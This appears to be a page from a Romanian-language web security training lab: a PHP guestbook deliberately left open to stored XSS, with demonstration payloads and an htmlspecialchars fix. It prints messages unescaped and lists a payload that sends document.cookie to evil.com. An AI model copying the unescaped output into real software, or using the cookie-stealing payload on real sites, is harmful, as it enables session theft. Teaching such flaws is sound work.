<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <title>XSS Stored — Vulnerabil</title>
    <style>
        body { font-family: sans-serif; max-width: 700px; margin: 40px auto; background: #f5f5f5; }
        .vuln-box { background:#fff3cd; border:2px solid #e74c3c; padding:15px; border-radius:5px; margin:15px 0; }
        .code-box { background:#2c3e50; color:#2ecc71; padding:15px; border-radius:5px; font-family:monospace; white-space:pre-wrap; margin:10px 0; }
        .guestbook { background:#fff; border:1px solid #ddd; padding:15px; border-radius:5px; margin:10px 0; }
        .message   { border-bottom:1px solid #eee; padding:8px 0; }
        input[type=text], textarea { width:100%; padding:8px; box-sizing:border-box; border:1px solid #ccc; border-radius:4px; margin:5px 0; }
        input[type=submit] { background:#e74c3c; color:#fff; padding:8px 16px; border:none; border-radius:4px; cursor:pointer; }
        .btn-clear { background:#7f8c8d; color:#fff; padding:8px 16px; border:none; border-radius:4px; cursor:pointer; margin-left:10px; }
    </style>
</head>
<body>
    <h1>&#128272; XSS Stored (Persistent)</h1>

    <div class="vuln-box">
        <strong>&#9888; PAGINĂ INTENȚIONAT VULNERABILĂ</strong><br>
        Mesajele sunt salvate în BD și afișate fără escape → codul JS se execută pentru
        <u>oricine vizitează pagina</u> (persistent, mai periculos decât XSS reflected).
    </div>

<?php
require_once '../config/db.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['clear'])) {
        $mysqli->query("DELETE FROM guestbook");
    } else {
        $name    = $_POST['name']    ?? '';
        $message = $_POST['message'] ?? '';
        if ($name !== '' && $message !== '') {
            // ===== VULNERABIL: salvare directă fără sanitizare =====
            $stmt = $mysqli->prepare("INSERT INTO guestbook (name, message) VALUES (?, ?)");
            $stmt->bind_param('ss', $name, $message);
            $stmt->execute();
            // =========================================================
        }
    }
}

$messages = $mysqli->query("SELECT name, message, created_at FROM guestbook ORDER BY created_at DESC")
                   ->fetch_all(MYSQLI_ASSOC);
?>

    <h2>Guestbook (Vulnerabil)</h2>
    <form method="post">
        <label>Numele tău:</label>
        <input type="text" name="name" placeholder="Numele tău">
        <label>Mesaj:</label>
        <textarea name="message" rows="3" placeholder="Încearcă: <script>alert('XSS stored!')</script>"></textarea>
        <input type="submit" value="Trimite mesaj">
        <button type="submit" name="clear" value="1" class="btn-clear">Șterge toate</button>
    </form>

    <h3>Mesaje salvate (afișate fără escape):</h3>
    <div class="guestbook">
        <?php if (empty($messages)): ?>
            <p><em>Niciun mesaj.</em></p>
        <?php endif; ?>
        <?php foreach ($messages as $msg): ?>
        <div class="message">
            <!-- ===== INJECȚIE XSS POSIBILĂ AICI — fără htmlspecialchars ===== -->
            <strong><?= $msg['name'] ?></strong>
            <small>(<?= $msg['created_at'] ?>)</small>:
            <p><?= $msg['message'] ?></p>
            <!-- ================================================================ -->
        </div>
        <?php endforeach; ?>
    </div>

    <h2>Exploit-uri de demonstrație</h2>
    <p>Trimite ca mesaj:</p>
    <div class="code-box">&lt;script&gt;alert('XSS stored! Toate sesiunile utilizatorilor sunt compromise!')&lt;/script&gt;

&lt;script&gt;document.body.style.background='red'; document.body.innerHTML='&lt;h1&gt;SITE COMPROMIS&lt;/h1&gt;';&lt;/script&gt;

&lt;img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)"&gt;</div>

    <h2>Remediere</h2>
    <div class="code-box">// ✅ La afișare, întotdeauna:
echo htmlspecialchars($msg['message'], ENT_QUOTES, 'UTF-8');

// ✅ Sau în HTML:
&lt;?= htmlspecialchars($row['message'], ENT_QUOTES, 'UTF-8') ?&gt;</div>

    <br><a href="index.php">← Înapoi la index</a>
</body>
</html>
